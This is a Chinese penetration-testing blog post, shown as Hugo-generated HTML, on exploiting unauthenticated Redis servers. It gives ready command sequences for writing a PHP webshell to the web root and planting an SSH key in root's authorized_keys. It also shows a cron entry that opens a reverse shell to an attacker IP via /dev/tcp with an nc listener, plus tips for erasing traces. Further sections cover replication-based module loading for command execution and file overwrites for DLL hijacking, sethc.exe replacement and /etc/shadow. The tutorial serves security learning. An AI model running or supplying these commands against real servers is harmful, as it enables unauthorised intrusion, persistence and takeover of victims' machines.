@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>Redis 未授权利用</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/redis/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Redis 未授权利用'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/redis/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/redis/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="Redis 未授权利用">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/redis/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/redis/">
+                <img src="/p/redis/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/redis/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/redis/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post Redis 未授权利用" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="background-color: #2a9d8f; color: #fff;">
+                渗透测试
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/redis/">Redis 未授权利用</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 09, 2020</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="redis未授权利用">Redis未授权利用</h1>
+<h2 id="redis常用命令">Redis常用命令</h2>
+<p>服务端启动：redis-server xxx.conf</p>
+<p>本地连接：redis-cli</p>
+<p>远程连接：redis-cli -h host -p port -a password</p>
+<h2 id="未授权利用方式">未授权利用方式</h2>
+<h3 id="写webshell">写Webshell</h3>
+<p>前提条件：</p>
+<ul>
+<li>知道Web目录</li>
+<li>redis运行用户拥有该目录写权限</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">keys *
+<span class="nb">set</span> webshell <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span> 
+
+config get *
+config <span class="nb">set</span> dir /var/www/html    <span class="c1"># 设置文件写入目录</span>
+config <span class="nb">set</span> dbfilename 1.php   <span class="c1"># 设置写入文件名</span>
+save <span class="c1"># 保存</span>
+
+</code></pre></div><p>注意</p>
+<blockquote>
+<p>redis可以创建文件，但无法创建目录</p>
+<p>清理痕迹要删除key，同时还原config里的配置项</p>
+</blockquote>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 431; 
+			flex-basis: 1034px"
+	>
+	<a href="/p/redis/image-20210728161846989.png" data-size="681x158">
+		<img src="/p/redis/image-20210728161846989.png"
+			width="681"
+			height="158"
+			srcset="/p/redis/image-20210728161846989_hu6d3d5ed4d385519572f260d87dc190a0_20681_480x0_resize_box_3.png 480w, /p/redis/image-20210728161846989_hu6d3d5ed4d385519572f260d87dc190a0_20681_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h3 id="写ssh公钥">写ssh公钥</h3>
+<p>目标靶机的基本配置</p>
+<blockquote>
+<p>存在root用户或其他用户下.ssh目录(权限700) 和 authorized_keys文件(权限600)</p>
+</blockquote>
+<p>前提条件:</p>
+<ul>
+<li>已知目标主机用户</li>
+<li>拥有.ssh目录</li>
+<li>允许使用基于密钥认证方式登录</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">// 本机生成公私钥
+ssh-keygen -t rsa
+// 将本机公钥放入key.txt
+<span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n&#34;</span><span class="p">;</span>cat id_rsa.pub<span class="p">;</span>ehco -e <span class="s2">&#34;\n&#34;</span><span class="o">)</span> &gt; key.txt
+
+// 执行redis命令，生成键值对
+cat /root/.ssh/key.txt <span class="p">|</span> redis-cli -h ip -x <span class="nb">set</span> pub
+
+config <span class="nb">set</span> dir /root/.ssh
+config <span class="nb">set</span> dbfilename authorized_keys
+save
+
+// 利用私钥登录
+ssh -i id_rsa root@ip
+</code></pre></div><h3 id="写定时任务反弹shell">写定时任务反弹shell</h3>
+<p>前提条件：</p>
+<ul>
+<li>redis用户拥有计划任务目录写权限</li>
+<li>目标开启cron服务</li>
+</ul>
+<pre tabindex="0"><code>// 攻击机开启监听
+nc -nvlp 7777
+
+set shell &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.10.140/7777 0&gt;&amp;1\n\n&quot;
+config set dir /var/spool/cron
+config set dbfilename root
+save
+</code></pre><p>注意：</p>
+<blockquote>
+<p>ubuntu反弹shell会出现多处错误：</p>
+<p>1.提示缺少默认邮件服务器，实际是因为计划任务执行出错，想要通过邮件服务器发送错误信息</p>
+<p>2.本质的错误信息为:<code>sh: 1: Syntax error: Bad fd number</code>，查询后发现cron中command的执行环境为/bin/sh，而/bin/sh指向的是dash(它更好，变成默认了)，反弹任务中用bash环境去执行，所以产生冲突报错。因此<strong>只需要将目标机器的/bin/sh指向bash就可</strong>，或者<strong>避免在cron文件里去使用bash这个shell，另外去建一个反弹shell的shell脚本文件，然后在任务计划里面去直接调用这个shell脚本文件</strong>，再<strong>或者写计划任务的反弹shell内容如下</strong>：<code>*/1 * * * *  bash -c &quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/7777 0&gt;&amp;1&quot;</code></p>
+<p>3.redis写入root文件权限为644，而root文件权限必须为600，否则报不安全错误</p>
+<p>3.redis写入文件后会出现乱码，centos主机会忽略乱码执行命令，而ubuntu和debian无法忽视乱码，不可以执行命令，<strong>反弹失败()</strong>。因此可尝试主从复制写纯净文件达到效果，当然有了可利用的主从就不一定执着于定时任务</p>
+</blockquote>
+<h3 id="主从复制rce">主从复制RCE</h3>
+<p>随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和cron，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了。</p>
+<h4 id="redis主从复制">Redis主从复制</h4>
+<p>edis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<p>使用两台虚拟机来模拟主从复制。</p>
+<p>在目标机器上设置slave状态</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1050; 
+			flex-basis: 2520px"
+	>
+	<a href="/p/redis/image-20210730095215245.png" data-size="420x40">
+		<img src="/p/redis/image-20210730095215245.png"
+			width="420"
+			height="40"
+			srcset="/p/redis/image-20210730095215245_hu070fd516717a35a17570414cbce412c7_7367_480x0_resize_box_3.png 480w, /p/redis/image-20210730095215245_hu070fd516717a35a17570414cbce412c7_7367_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>在master上设置键 xxx</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 748; 
+			flex-basis: 1797px"
+	>
+	<a href="/p/redis/image-20210730095122095.png" data-size="322x43">
+		<img src="/p/redis/image-20210730095122095.png"
+			width="322"
+			height="43"
+			srcset="/p/redis/image-20210730095122095_hu571c699dcdbe49b471e169725e172c3b_5597_480x0_resize_box_3.png 480w, /p/redis/image-20210730095122095_hu571c699dcdbe49b471e169725e172c3b_5597_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>在slave上查看键 xxx</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 316; 
+			flex-basis: 760px"
+	>
+	<a href="/p/redis/image-20210730095425753.png" data-size="266x84">
+		<img src="/p/redis/image-20210730095425753.png"
+			width="266"
+			height="84"
+			srcset="/p/redis/image-20210730095425753_hu9f45b1b8710c5825e625035a3b044232_9812_480x0_resize_box_3.png 480w, /p/redis/image-20210730095425753_hu9f45b1b8710c5825e625035a3b044232_9812_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h4 id="redis模块">Redis模块</h4>
+<p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p>
+<p>编译.so模块, 代码: <a class="link" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand"  target="_blank" rel="noopener"
+    >https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a>.</p>
+<h4 id="利用原理">利用原理</h4>
+<p>详细原理：https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</p>
+<p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载恶意.so文件，我们就可以执行拓展的新命令了。</p>
+<h4 id="复现主动连接模式">复现——主动连接模式</h4>
+<p>使用脚本模拟一个服务端来作为master(包含fullresync请求)</p>
+<p>本次目标靶机为ubuntu，作为slave</p>
+<p>直接执行poc脚本如下:</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 203; 
+			flex-basis: 488px"
+	>
+	<a href="/p/redis/image-20210730101548100.png" data-size="1263x620">
+		<img src="/p/redis/image-20210730101548100.png"
+			width="1263"
+			height="620"
+			srcset="/p/redis/image-20210730101548100_hu8fa80427c27b07cd9b9b029a6c4d7013_216713_480x0_resize_box_3.png 480w, /p/redis/image-20210730101548100_hu8fa80427c27b07cd9b9b029a6c4d7013_216713_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h4 id="复现被动连接模式">复现——被动连接模式</h4>
+<p>模拟一个服务端master，等待连接</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 328; 
+			flex-basis: 787px"
+	>
+	<a href="/p/redis/image-20210730144513791.png" data-size="420x128">
+		<img src="/p/redis/image-20210730144513791.png"
+			width="420"
+			height="128"
+			srcset="/p/redis/image-20210730144513791_hu77a885d43ba5b9a8174817aebed28a49_18766_480x0_resize_box_3.png 480w, /p/redis/image-20210730144513791_hu77a885d43ba5b9a8174817aebed28a49_18766_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>redis未授权进入目标机器，slaveof到该master</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1024; 
+			flex-basis: 2458px"
+	>
+	<a href="/p/redis/image-20210730144632522.png" data-size="420x41">
+		<img src="/p/redis/image-20210730144632522.png"
+			width="420"
+			height="41"
+			srcset="/p/redis/image-20210730144632522_huc7cf3e959501a46b1915cca09533af6b_6310_480x0_resize_box_3.png 480w, /p/redis/image-20210730144632522_huc7cf3e959501a46b1915cca09533af6b_6310_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>master端等到连接后，成功同步恶意payload至slave</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 575; 
+			flex-basis: 1380px"
+	>
+	<a href="/p/redis/image-20210730144740877.png" data-size="1260x219">
+		<img src="/p/redis/image-20210730144740877.png"
+			width="1260"
+			height="219"
+			srcset="/p/redis/image-20210730144740877_hu34d7b9e8833b08703c7e61d91f62e5ab_45114_480x0_resize_box_3.png 480w, /p/redis/image-20210730144740877_hu34d7b9e8833b08703c7e61d91f62e5ab_45114_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>成功在目标机器加载模块并执行命令</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 224; 
+			flex-basis: 539px"
+	>
+	<a href="/p/redis/image-20210730144902534.png" data-size="420x187">
+		<img src="/p/redis/image-20210730144902534.png"
+			width="420"
+			height="187"
+			srcset="/p/redis/image-20210730144902534_hu51ed75f60e59bf403d29445a9513e6b1_22778_480x0_resize_box_3.png 480w, /p/redis/image-20210730144902534_hu51ed75f60e59bf403d29445a9513e6b1_22778_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h3 id="主从复制写纯净文件">主从复制写纯净文件</h3>
+<p>在 linux 下，可以利用 SYNC 主从同步，来直接写入无杂质的文件，脚本及用法如下：</p>
+<p><a class="link" href="https://github.com/r35tart/RedisWriteFile"  target="_blank" rel="noopener"
+    >https://github.com/r35tart/RedisWriteFile</a> (借助原本的redis主从复制rce脚本更改)</p>
+<p>此脚本是通过 Redis 主从写出无损文件，可用于 Windows 平台下写出无损的 EXE、DLL、 LNK 和 Linux 下的 SO 等二进制文件</p>
+<p>也可以用无杂质覆写 Linux 中的 /etc/shadow</p>
+<h4 id="简单复现">简单复现</h4>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 251; 
+			flex-basis: 603px"
+	>
+	<a href="/p/redis/image-20210730163624626.png" data-size="1253x498">
+		<img src="/p/redis/image-20210730163624626.png"
+			width="1253"
+			height="498"
+			srcset="/p/redis/image-20210730163624626_hu67f86e1d910ebf0746c8464568858265_80788_480x0_resize_box_3.png 480w, /p/redis/image-20210730163624626_hu67f86e1d910ebf0746c8464568858265_80788_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>成功写入纯净文件</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 733; 
+			flex-basis: 1760px"
+	>
+	<a href="/p/redis/image-20210730163854415.png" data-size="550x75">
+		<img src="/p/redis/image-20210730163854415.png"
+			width="550"
+			height="75"
+			srcset="/p/redis/image-20210730163854415_hu4d68ba72da8b6bd141dca66da96addb5_13557_480x0_resize_box_3.png 480w, /p/redis/image-20210730163854415_hu4d68ba72da8b6bd141dca66da96addb5_13557_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="redis在windows下的利用方式">Redis在Windows下的利用方式</h2>
+<p>主要是利用主从写纯净文件：</p>
+<ol>
+<li>系统 <code>DLL</code> 劫持 （目标重启或注销）</li>
+<li>针对特定软件的 <code>DLL</code> 劫持（目标一次点击）</li>
+<li>覆写目标的快捷方式 （目标一次点击）</li>
+<li>覆写特定软件的配置文件达到提权目的 （目标无需点击或一次点击）</li>
+<li>覆写 <code>sethc.exe</code> 等文件 （攻击方一次触发）</li>
+</ol>
+<p><strong>参考：</strong></p>
+<p><a class="link" href="http://r3start.net/index.php/2020/05/25/717"  target="_blank" rel="noopener"
+    >http://r3start.net/index.php/2020/05/25/717</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/sql-phpmyadmin/">
+        
+        
+            <div class="article-image">
+                <img src="/p/sql-phpmyadmin/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post phpMyAdmin 常见利用"
+                        data-key="sql-phpmyadmin" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">phpMyAdmin 常见利用</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/wifi/">
+        
+        
+            <div class="article-image">
+                <img src="/p/wifi/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 破解WiFi密码"
+                        data-key="wifi" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">破解WiFi密码</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/1/_hu0a3f1163de68d0b9471979ebf0ecf11e_32400_a354a9a1f5102742bceb4ec236f4ce2f.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Linux 提权"
+                        data-key="1" 
+                        data-hash="md5-rC&#43;UhC7sa7h6Y66uIugvQQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Linux 提权</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#redis常用命令">Redis常用命令</a></li>
+    <li><a href="#未授权利用方式">未授权利用方式</a>
+      <ol>
+        <li><a href="#写webshell">写Webshell</a></li>
+        <li><a href="#写ssh公钥">写ssh公钥</a></li>
+        <li><a href="#写定时任务反弹shell">写定时任务反弹shell</a></li>
+        <li><a href="#主从复制rce">主从复制RCE</a>
+          <ol>
+            <li><a href="#redis主从复制">Redis主从复制</a></li>
+            <li><a href="#redis模块">Redis模块</a></li>
+            <li><a href="#利用原理">利用原理</a></li>
+            <li><a href="#复现主动连接模式">复现——主动连接模式</a></li>
+            <li><a href="#复现被动连接模式">复现——被动连接模式</a></li>
+          </ol>
+        </li>
+        <li><a href="#主从复制写纯净文件">主从复制写纯净文件</a>
+          <ol>
+            <li><a href="#简单复现">简单复现</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#redis在windows下的利用方式">Redis在Windows下的利用方式</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
